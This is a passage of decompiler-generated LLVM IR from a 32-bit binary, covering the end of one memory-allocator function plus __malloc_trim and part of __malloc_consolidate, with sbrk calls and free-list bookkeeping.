  %v4_804fff1 = inttoptr i32 %v3_804fff1 to i32*
  %v5_804fff1 = load i32, i32* %v4_804fff1, align 4
  %v6_804fff1 = or i32 %v5_804fff1, 1
  store i32 %v6_804fff1, i32* %v4_804fff1, align 4
  br label %dec_label_pc_804fff6

dec_label_pc_804fff6:                             ; preds = %dec_label_pc_804faf9, %dec_label_pc_804fff1
  %v0_804fff6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fff6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fffa:                             ; preds = %dec_label_pc_804fdb8, %dec_label_pc_804ff6e, %dec_label_pc_804fdc2
  %v0_804fffa = load i32, i32* %stack_var_-92, align 4
  %v1_804fffa = call i32 @__errno_location(i32 %v0_804fffa)
  store i32 %v1_804fffa, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050001 = inttoptr i32 %v1_804fffa to i32*
  store i32 12, i32* %v1_8050001, align 4
  br label %dec_label_pc_8050007

dec_label_pc_8050007:                             ; preds = %dec_label_pc_804fff6, %dec_label_pc_804ffec, %dec_label_pc_804ff97, %dec_label_pc_804fc53, %dec_label_pc_804fc05, %dec_label_pc_804f98c, %dec_label_pc_804fffa
  store i32 %v2_804f8c3, i32* @eax, align 4
  store i32 %v2_804f8c3, i32* %stack_var_-92, align 4
  %v2_8050010 = call i32 @__pthread_return_void(i32 %v2_804f8c3, i32 1)
  store i32 %v2_8050010, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050018

dec_label_pc_8050018:                             ; preds = %dec_label_pc_804f8e1, %dec_label_pc_8050007
  %v0_805001b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805001b, i32* %eax.global-to-local, align 4
  %v2_805001d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805001d, i32* @ebx, align 4
  store i32 %v0_804f8b0, i32* @esi, align 4
  store i32 %v0_804f8af, i32* @edi, align 4
  store i32 %v0_804f8ae, i32* @ebp, align 4
  ret i32 %v0_805001b

; uselistorder directives
  uselistorder i32 %v0_804ffde, { 1, 0 }
  uselistorder i32 %v0_804ffbe, { 1, 0, 2 }
  uselistorder i32 %v2_804ff5b, { 1, 0, 2 }
  uselistorder i32 %v0_804ff49, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804fee0, { 1, 0 }
  uselistorder i32 %v2_804fece, { 1, 0 }
  uselistorder i32 %v1_804fe85, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804fe6f, { 1, 0, 2 }
  uselistorder i32 %v2_804fe63, { 1, 2, 0 }
  uselistorder i32 %v2_804fe5e, { 1, 0, 2 }
  uselistorder i32 %v1_804fe4e, { 2, 1, 0 }
  uselistorder i8 %v0_804fe1c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804fdff, { 1, 0, 2 }
  uselistorder i32 %v0_804feb391, { 2, 0, 1 }
  uselistorder i32 %v0_804fec192, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804fdf9, { 2, 1, 0 }
  uselistorder i32 %v8_804fdcf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804fdcc, { 1, 0 }
  uselistorder i32 %v0_804fdab, { 1, 0 }
  uselistorder i32 %v2_804fd7c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804fd74, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804fd61, { 1, 0 }
  uselistorder i32 %v1_804fd58, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_804fd45, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804fd29, { 1, 0, 2 }
  uselistorder i32 %v2_804fd15, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804fcde, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804fcd2, { 2, 1, 0 }
  uselistorder i32 %v8_804fcc1, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804fca8, { 1, 0, 2 }
  uselistorder i32 %v0_804fc44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804fc17, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fc0d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804fbff, { 1, 0 }
  uselistorder i32 %v1_804fb96, { 1, 0 }
  uselistorder i32 %v3_804fb8a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804fb9a, { 1, 0 }
  uselistorder i32 %v2_804fb84, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804fb8112, { 1, 0 }
  uselistorder i32 %v2_804fb76, { 1, 0 }
  uselistorder i32 %v1_804fb5a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804fb56, { 2, 1, 0 }
  uselistorder i32 %v1_804fb52, { 1, 0 }
  uselistorder i32 %v1_804fb46, { 2, 1, 0 }
  uselistorder i32 %v2_804fb3c, { 1, 0 }
  uselistorder i32 %v1_804fb39, { 1, 2, 0 }
  uselistorder i32 %v4_804fad7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804fb22, { 1, 0 }
  uselistorder i32 %v0_804faf0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804fac3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fa90, { 1, 2, 0 }
  uselistorder i32 %v2_804fa74, { 1, 0 }
  uselistorder i32 %v1_804fa6a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804fa65.lcssa, { 1, 0 }
  uselistorder i32 %v3_804fa55, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804fa4c, { 1, 0, 2 }
  uselistorder i32 %v2_804fa28, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fa10, { 2, 1, 0 }
  uselistorder i32 %v0_804f9fc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804f9c2, { 1, 0, 2 }
  uselistorder i32 %v0_804fa90111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804f96f, { 1, 0, 2 }
  uselistorder i32 %v2_804f961, { 2, 1, 0 }
  uselistorder i32 %v2_804f93c, { 2, 1, 0 }
  uselistorder i8 %v0_804f90a, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804fca2, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804f8f3, { 0, 2, 1 }
  uselistorder i32 %v0_804f8dc, { 1, 0 }
  uselistorder i32 %v2_804f8c3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 22, 21, 23, 24, 28, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52 }
  uselistorder i32* %ecx.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 20, 0, 22, 23, 24, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 62, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 58, 0, 59, 60, 61 }
  uselistorder i32 (i32)* @free, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_805b8a0.134, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @malloc, { 1, 10, 9, 8, 3, 7, 6, 5, 4, 2, 0 }
  uselistorder i32 134591860, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_805b580.122, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805b56c.119 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805b56c.119 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 -32, { 0, 1, 2, 16, 17, 4, 3, 5, 6, 7, 11, 10, 9, 8, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_8050018, { 1, 0 }
  uselistorder label %dec_label_pc_8050007, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804fffa, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fff6, { 1, 0 }
  uselistorder label %dec_label_pc_804ffec, { 1, 0 }
  uselistorder label %dec_label_pc_804ff97, { 1, 0 }
  uselistorder label %dec_label_pc_804ff6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ff5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ff49, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fedb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fed6, { 1, 0 }
  uselistorder label %dec_label_pc_804feba, { 1, 0 }
  uselistorder label %dec_label_pc_804fe63, { 1, 0 }
  uselistorder label %dec_label_pc_804fe4c, { 1, 0 }
  uselistorder label %dec_label_pc_804fe35, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_804fdab, { 1, 0 }
  uselistorder label %dec_label_pc_804fd6c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd45, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fd29, { 1, 0 }
  uselistorder label %dec_label_pc_804fd10, { 1, 0 }
  uselistorder label %dec_label_pc_804fcf2, { 1, 0 }
  uselistorder label %dec_label_pc_804fc0d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc05, { 1, 0 }
  uselistorder label %dec_label_pc_804fbee, { 1, 0 }
  uselistorder label %dec_label_pc_804fb81, { 1, 0 }
  uselistorder label %dec_label_pc_804fb86.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804fb5a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fae1, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804fa68, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804fa51, { 1, 0 }
  uselistorder label %dec_label_pc_804f9bf, { 1, 0 }
  uselistorder label %dec_label_pc_804fa90.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f98c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804f90a, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805002b = load i32, i32* @edx, align 4
  store i32 %v0_805002b, i32* %ebp.global-to-local, align 4
  %v1_805002d = add i32 %v0_805002b, 860
  %v2_805002d = inttoptr i32 %v1_805002d to i32*
  %v3_805002d = load i32, i32* %v2_805002d, align 4
  store i32 %v3_805002d, i32* @ecx, align 4
  %v1_8050033 = add i32 %v0_805002b, 44
  %v2_8050033 = inttoptr i32 %v1_8050033 to i32*
  %v3_8050033 = load i32, i32* %v2_8050033, align 4
  %v1_8050036 = add i32 %v3_8050033, 4
  %v2_8050036 = inttoptr i32 %v1_8050036 to i32*
  %v3_8050036 = load i32, i32* %v2_8050036, align 4
  %v1_8050039 = and i32 %v3_8050036, -4
  store i32 %v1_8050039, i32* @esi, align 4
  %v1_805003e = load i32, i32* @eax, align 4
  %v2_805003e = add i32 %v3_805002d, -17
  %v2_8050040 = add i32 %v2_805003e, %v1_8050039
  %v3_8050040 = sub i32 %v2_8050040, %v1_805003e
  %div = udiv i32 %v3_8050040, %v3_805002d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050040, %v3_805002d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050048 = add i32 %div, -1
  %v4_805004b = mul i32 %v1_8050048, %v3_805002d
  store i32 %v4_805004b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805004b, 1
  br i1 %tmp11, label %dec_label_pc_80500a7, label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %entry
  %v1_8050057 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050057, i32* %edi.global-to-local, align 4
  %v0_805005e = load i32, i32* @esi, align 4
  store i32 %v0_805005e, i32* %eax.global-to-local, align 4
  %v1_8050060 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050060 = add i32 %v1_8050060, 44
  %v3_8050060 = inttoptr i32 %v2_8050060 to i32*
  %v4_8050060 = load i32, i32* %v3_8050060, align 4
  %v5_8050060 = add i32 %v4_8050060, %v0_805005e
  store i32 %v5_8050060, i32* %eax.global-to-local, align 4
  %v12_8050066 = icmp eq i32 %v1_8050057, %v5_8050060
  %v1_8050068 = icmp eq i1 %v12_8050066, false
  br i1 %v1_8050068, label %dec_label_pc_80500a7, label %dec_label_pc_805006a

dec_label_pc_805006a:                             ; preds = %dec_label_pc_8050052
  %v1_805006d = sub i32 0, %v4_805004b
  store i32 %v1_805006d, i32* @ebx, align 4
  %v1_8050070 = call i32 @__GI_sbrk(i32 %v1_805006d)
  store i32 %v1_8050070, i32* %eax.global-to-local, align 4
  %v1_805007c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805007c, i32* %eax.global-to-local, align 4
  %v10_8050084 = icmp eq i32 %v1_805007c, -1
  br i1 %v10_8050084, label %dec_label_pc_80500a7, label %dec_label_pc_8050089

dec_label_pc_8050089:                             ; preds = %dec_label_pc_805006a
  %v0_8050089 = load i32, i32* %edi.global-to-local, align 4
  %v2_805008b = sub i32 %v0_8050089, %v1_805007c
  %v12_805008b = icmp eq i32 %v2_805008b, 0
  store i32 %v2_805008b, i32* @ecx, align 4
  br i1 %v12_805008b, label %dec_label_pc_80500a7, label %dec_label_pc_805008f

dec_label_pc_805008f:                             ; preds = %dec_label_pc_8050089
  %v0_805008f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805008f = add i32 %v0_805008f, 44
  %v2_805008f = inttoptr i32 %v1_805008f to i32*
  %v3_805008f = load i32, i32* %v2_805008f, align 4
  store i32 %v3_805008f, i32* %eax.global-to-local, align 4
  %v1_8050092 = add i32 %v0_805008f, 872
  %v2_8050092 = inttoptr i32 %v1_8050092 to i32*
  %v3_8050092 = load i32, i32* %v2_8050092, align 4
  %v5_8050092 = sub i32 %v3_8050092, %v2_805008b
  store i32 %v5_8050092, i32* %v2_8050092, align 4
  %v0_8050098 = load i32, i32* @esi, align 4
  %v1_8050098 = load i32, i32* @ecx, align 4
  %v2_8050098 = sub i32 %v0_8050098, %v1_8050098
  %v1_805009a = or i32 %v2_8050098, 1
  %v1_805009d = load i32, i32* %eax.global-to-local, align 4
  %v2_805009d = add i32 %v1_805009d, 4
  %v3_805009d = inttoptr i32 %v2_805009d to i32*
  store i32 %v1_805009a, i32* %v3_805009d, align 4
  br label %dec_label_pc_80500a9

dec_label_pc_80500a7:                             ; preds = %dec_label_pc_8050089, %dec_label_pc_805006a, %dec_label_pc_8050052, %entry
  br label %dec_label_pc_80500a9

dec_label_pc_80500a9:                             ; preds = %dec_label_pc_805008f, %dec_label_pc_80500a7
  %storemerge = phi i32 [ 1, %dec_label_pc_805008f ], [ 0, %dec_label_pc_80500a7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805007c, { 1, 0, 2 }
  uselistorder i32 %v4_805004b, { 1, 2, 0 }
  uselistorder i32 %v3_805002d, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80500a9, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80500b2 = load i32, i32* @edi, align 4
  %v0_80500b3 = load i32, i32* @esi, align 4
  %v0_80500b4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80500bc = load i32, i32* %arg1, align 4
  store i32 %v2_80500bc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80500c3 = icmp eq i32 %v2_80500bc, 0
  br i1 %v1_80500c3, label %dec_label_pc_80501ec.preheader, label %dec_label_pc_80500cb

dec_label_pc_80501ec.preheader:                   ; preds = %entry
  %v3_80501e1 = add i32 %tmp11, 44
  br label %dec_label_pc_80501dd

dec_label_pc_80500cb:                             ; preds = %entry
  %v1_80500cf = and i32 %v2_80500bc, -3
  store i32 %v1_80500cf, i32* %arg1, align 4
  %v1_80500d4 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_80500df = add i32 %tmp11, 4
  store i32 %v1_80500df, i32* %eax.global-to-local, align 4
  %v2_80500ea = load i32, i32* %arg1, align 4
  %v2_80500f0 = udiv i32 %v2_80500ea, 8
  %v2_80500f3 = mul nuw i32 %v2_80500f0, 4
  %v3_80500f3 = add i32 %tmp11, -4
  %v4_80500f3 = add i32 %v3_80500f3, %v2_80500f3
  store i32 %v4_80500f3, i32* %eax.global-to-local, align 4
  %v2_80501ba = add i32 %tmp11, 44
  %v3_80501ba = inttoptr i32 %v2_80501ba to i32*
  %v1_805018d = add i32 %tmp11, 60
  %v2_805018d = inttoptr i32 %v1_805018d to i32*
  br label %dec_label_pc_80500fb

dec_label_pc_80500fb:                             ; preds = %dec_label_pc_80501d3, %dec_label_pc_80500cb
  %v0_8050109 = phi i32 [ %v1_80500df, %dec_label_pc_80500cb ], [ %v4_80501d3, %dec_label_pc_80501d3 ]
  store i32 %v0_8050109, i32* %eax.global-to-local, align 4
  %v1_80500ff = inttoptr i32 %v0_8050109 to i32*
  %v2_80500ff = load i32, i32* %v1_80500ff, align 4
  store i32 %v2_80500ff, i32* @ecx, align 4
  %v1_8050101 = icmp eq i32 %v2_80500ff, 0
  br i1 %v1_8050101, label %dec_label_pc_80501c9, label %dec_label_pc_8050109

dec_label_pc_8050109:                             ; preds = %dec_label_pc_80500fb
  store i32 0, i32* %v1_80500ff, align 4
  %v0_805010f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805010f

dec_label_pc_805010f:                             ; preds = %dec_label_pc_80501bd, %dec_label_pc_8050109
  %v0_805012c = phi i32 [ %v3_805010f, %dec_label_pc_80501bd ], [ %v0_805010f.pre, %dec_label_pc_8050109 ]
  %v1_805010f = add i32 %v0_805012c, 8
  %v2_805010f = inttoptr i32 %v1_805010f to i32*
  %v3_805010f = load i32, i32* %v2_805010f, align 4
  store i32 %v3_805010f, i32* %edx.global-to-local, align 4
  %v1_8050116 = add i32 %v0_805012c, 4
  %v2_8050116 = inttoptr i32 %v1_8050116 to i32*
  %v3_8050116 = load i32, i32* %v2_8050116, align 4
  store i32 %v3_8050116, i32* %eax.global-to-local, align 4
  %v1_805011b = and i32 %v3_8050116, -2
  store i32 %v1_805011b, i32* @edi, align 4
  %v2_805011e = urem i32 %v3_8050116, 2
  %v3_805011e = icmp eq i32 %v2_805011e, 0
  %v2_8050120 = add i32 %v1_805011b, %v0_805012c
  store i32 %v2_8050120, i32* @ebx, align 4
  %v1_8050123 = add i32 %v2_8050120, 4
  %v2_8050123 = inttoptr i32 %v1_8050123 to i32*
  %v3_8050123 = load i32, i32* %v2_8050123, align 4
  store i32 %v3_8050123, i32* %edx.global-to-local, align 4
  %v1_805012a = icmp eq i1 %v3_805011e, false
  br i1 %v1_805012a, label %dec_label_pc_805014c, label %dec_label_pc_805012c

dec_label_pc_805012c:                             ; preds = %dec_label_pc_805010f
  %v1_805012c = inttoptr i32 %v0_805012c to i32*
  %v2_805012c = load i32, i32* %v1_805012c, align 4
  store i32 %v2_805012c, i32* %ebp.global-to-local, align 4
  %v2_8050130 = sub i32 %v0_805012c, %v2_805012c
  store i32 %v2_8050130, i32* %eax.global-to-local, align 4
  %v1_8050132 = add i32 %v2_8050130, 8
  %v2_8050132 = inttoptr i32 %v1_8050132 to i32*
  %v3_8050132 = load i32, i32* %v2_8050132, align 4
  store i32 %v3_8050132, i32* @esi, align 4
  %v1_8050135 = add i32 %v2_8050130, 12
  %v2_8050135 = inttoptr i32 %v1_8050135 to i32*
  %v3_8050135 = load i32, i32* %v2_8050135, align 4
  store i32 %v3_8050135, i32* %edx.global-to-local, align 4
  %v1_8050138 = add i32 %v3_8050132, 12
  %v2_8050138 = inttoptr i32 %v1_8050138 to i32*
  %v3_8050138 = load i32, i32* %v2_8050138, align 4
  store i32 %v3_8050138, i32* @ecx, align 4
  %v12_805013b = icmp eq i32 %v3_8050138, %v2_8050130
  %v1_805013d = icmp eq i1 %v12_805013b, false
  br i1 %v1_805013d, label %dec_label_pc_805017c, label %dec_label_pc_805013f

dec_label_pc_805013f:                             ; preds = %dec_label_pc_805012c
  %v1_805013f = add i32 %v3_8050135, 8
  %v2_805013f = inttoptr i32 %v1_805013f to i32*
  %v3_805013f = load i32, i32* %v2_805013f, align 4
  %v15_805013f = icmp eq i32 %v3_805013f, %v3_8050138
  %v1_8050142 = icmp eq i1 %v15_805013f, false
  br i1 %v1_8050142, label %dec_label_pc_805017c, label %dec_label_pc_8050144

dec_label_pc_8050144:                             ; preds = %dec_label_pc_805013f
  %v2_8050144 = add i32 %v2_805012c, %v1_805011b
  store i32 %v2_8050144, i32* @edi, align 4
  store i32 %v3_8050135, i32* %v2_8050138, align 4
  %v0_8050149 = load i32, i32* @esi, align 4
  %v1_8050149 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050149 = add i32 %v1_8050149, 8
  %v3_8050149 = inttoptr i32 %v2_8050149 to i32*
  store i32 %v0_8050149, i32* %v3_8050149, align 4
  %v0_8050157.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805014c

dec_label_pc_805014c:                             ; preds = %dec_label_pc_805010f, %dec_label_pc_8050144
  %v1_8050160 = phi i32 [ %v2_8050120, %dec_label_pc_805010f ], [ %v0_8050157.pre, %dec_label_pc_8050144 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050154 = and i32 %v3_8050123, -4
  store i32 %v1_8050154, i32* %ebp.global-to-local, align 4
  %v4_8050157 = load i32, i32* %v3_80501ba, align 4
  %v15_8050157 = icmp eq i32 %v1_8050160, %v4_8050157
  br i1 %v15_8050157, label %dec_label_pc_80501ad, label %dec_label_pc_805015c

dec_label_pc_805015c:                             ; preds = %dec_label_pc_805014c
  %v2_805015c = add i32 %v1_8050160, 4
  %v3_805015c = add i32 %v2_805015c, %v1_8050154
  %v4_805015c = inttoptr i32 %v3_805015c to i32*
  %v5_805015c = load i32, i32* %v4_805015c, align 4
  store i32 %v5_805015c, i32* %eax.global-to-local, align 4
  %v3_8050160 = inttoptr i32 %v2_805015c to i32*
  store i32 %v1_8050154, i32* %v3_8050160, align 4
  %v0_8050163 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050163 = urem i32 %v0_8050163, 2
  %v2_8050163 = icmp eq i32 %v1_8050163, 0
  store i32 %v1_8050163, i32* %eax.global-to-local, align 4
  %v1_8050168 = icmp eq i1 %v2_8050163, false
  br i1 %v1_8050168, label %dec_label_pc_8050189, label %dec_label_pc_805016a

dec_label_pc_805016a:                             ; preds = %dec_label_pc_805015c
  %v0_805016a = load i32, i32* @ebx, align 4
  %v1_805016a = add i32 %v0_805016a, 8
  %v2_805016a = inttoptr i32 %v1_805016a to i32*
  %v3_805016a = load i32, i32* %v2_805016a, align 4
  store i32 %v3_805016a, i32* @edx, align 4
  %v1_805016d = add i32 %v0_805016a, 12
  %v2_805016d = inttoptr i32 %v1_805016d to i32*
  %v3_805016d = load i32, i32* %v2_805016d, align 4
  store i32 %v3_805016d, i32* %eax.global-to-local, align 4
  %v1_8050170 = add i32 %v3_805016a, 12
  %v2_8050170 = inttoptr i32 %v1_8050170 to i32*
  %v3_8050170 = load i32, i32* %v2_8050170, align 4
  store i32 %v3_8050170, i32* @esi, align 4
  %v12_8050173 = icmp eq i32 %v3_8050170, %v0_805016a
  %v1_8050175 = icmp eq i1 %v12_8050173, false
  br i1 %v1_8050175, label %dec_label_pc_805017c, label %dec_label_pc_8050177

dec_label_pc_8050177:                             ; preds = %dec_label_pc_805016a
  %v1_8050177 = add i32 %v3_805016d, 8
  %v2_8050177 = inttoptr i32 %v1_8050177 to i32*
  %v3_8050177 = load i32, i32* %v2_8050177, align 4
  %v15_8050177 = icmp eq i32 %v3_8050177, %v3_8050170
  br i1 %v15_8050177, label %dec_label_pc_8050181, label %dec_label_pc_805017c

dec_label_pc_805017c:                             ; preds = %dec_label_pc_8050177, %dec_label_pc_805016a, %dec_label_pc_805013f, %dec_label_pc_805012c
  %v0_805017c = call i32 @abort()
  store i32 %v0_805017c, i32* %eax.global-to-local, align 4
  %v1_8050183.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050181

dec_label_pc_8050181:                             ; preds = %dec_label_pc_8050177, %dec_label_pc_805017c
  %v1_8050183 = phi i32 [ %v3_805016a, %dec_label_pc_8050177 ], [ %v1_8050183.pre, %dec_label_pc_805017c ]
  %v0_8050183 = phi i32 [ %v3_805016d, %dec_label_pc_8050177 ], [ %v0_805017c, %dec_label_pc_805017c ]
  %v0_8050181 = load i32, i32* @edi, align 4
  %v1_8050181 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050181 = add i32 %v1_8050181, %v0_8050181
  store i32 %v2_8050181, i32* @edi, align 4
  %v2_8050183 = add i32 %v1_8050183, 12
  %v3_8050183 = inttoptr i32 %v2_8050183 to i32*
  store i32 %v0_8050183, i32* %v3_8050183, align 4
  %v0_8050186 = load i32, i32* @edx, align 4
  %v1_8050186 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050186 = add i32 %v1_8050186, 8
  %v3_8050186 = inttoptr i32 %v2_8050186 to i32*
  store i32 %v0_8050186, i32* %v3_8050186, align 4
  br label %dec_label_pc_8050189

dec_label_pc_8050189:                             ; preds = %dec_label_pc_805015c, %dec_label_pc_8050181
  store i32 %v1_80500d4, i32* %eax.global-to-local, align 4
  %v3_805018d = load i32, i32* %v2_805018d, align 4
  store i32 %v3_805018d, i32* @edx, align 4
  %v0_8050190 = load i32, i32* @ecx, align 4
  store i32 %v0_8050190, i32* %v2_805018d, align 4
  %v0_8050193 = load i32, i32* @edi, align 4
  %v1_8050195 = or i32 %v0_8050193, 1
  store i32 %v1_8050195, i32* %eax.global-to-local, align 4
  %v0_8050198 = load i32, i32* @ecx, align 4
  %v1_8050198 = load i32, i32* @edx, align 4
  %v2_8050198 = add i32 %v1_8050198, 12
  %v3_8050198 = inttoptr i32 %v2_8050198 to i32*
  store i32 %v0_8050198, i32* %v3_8050198, align 4
  %v0_805019b = load i32, i32* %eax.global-to-local, align 4
  %v1_805019b = load i32, i32* @ecx, align 4
  %v2_805019b = add i32 %v1_805019b, 4
  %v3_805019b = inttoptr i32 %v2_805019b to i32*
  store i32 %v0_805019b, i32* %v3_805019b, align 4
  store i32 %v1_80500d4, i32* %eax.global-to-local, align 4
  %v0_80501a2 = load i32, i32* @edx, align 4
  %v1_80501a2 = load i32, i32* @ecx, align 4
  %v2_80501a2 = add i32 %v1_80501a2, 8
  %v3_80501a2 = inttoptr i32 %v2_80501a2 to i32*
  store i32 %v0_80501a2, i32* %v3_80501a2, align 4
  %v0_80501a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501a5 = load i32, i32* @ecx, align 4
  %v2_80501a5 = add i32 %v1_80501a5, 12
  %v3_80501a5 = inttoptr i32 %v2_80501a5 to i32*
  store i32 %v0_80501a5, i32* %v3_80501a5, align 4
  %v0_80501a8 = load i32, i32* @edi, align 4
  %v1_80501a8 = load i32, i32* @ecx, align 4
  %v3_80501a8 = add i32 %v1_80501a8, %v0_80501a8
  %v4_80501a8 = inttoptr i32 %v3_80501a8 to i32*
  store i32 %v0_80501a8, i32* %v4_80501a8, align 4
  br label %dec_label_pc_80501bd

dec_label_pc_80501ad:                             ; preds = %dec_label_pc_805014c
  %v0_80501ad = load i32, i32* @edi, align 4
  %v2_80501ad = add i32 %v0_80501ad, %v1_8050154
  %v1_80501b0 = or i32 %v2_80501ad, 1
  store i32 %v1_80501b0, i32* %eax.global-to-local, align 4
  %v1_80501b3 = load i32, i32* @ecx, align 4
  %v2_80501b3 = add i32 %v1_80501b3, 4
